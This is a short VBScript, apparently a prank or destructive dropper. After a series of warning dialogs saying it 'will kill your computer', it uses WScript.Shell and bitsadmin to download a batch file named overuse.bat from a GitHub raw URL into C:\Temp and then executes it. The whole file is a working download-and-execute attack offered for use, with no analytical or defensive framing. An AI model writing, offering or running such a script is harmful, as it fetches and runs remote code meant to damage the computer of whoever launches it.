MsgBox "Warning! Do you want to execute buddy?", vbYesNo, "Warning!"

If vbYes = MsgBox("Do you want to proceed?", vbYesNo, "!Last Warn Blud!") Then
    If vbYes = MsgBox("Hey Blud, this will kill your computer. Do you want to execute? :) (I'm not responsible.)", vbYesNo, "!Last Warn Blud!") Then
        Set objShell = CreateObject("WScript.Shell")
        objShell.Run "cmd.exe /c bitsadmin /transfer myDownloadJob /download /priority normal https://raw.githubusercontent.com/monkebutcool/UserScripts/main/overuse.bat C:\Temp\overuse.bat", 1, True
        objShell.Run "cmd.exe /c C:\Temp\overuse.bat", 1, True
    End If
End If
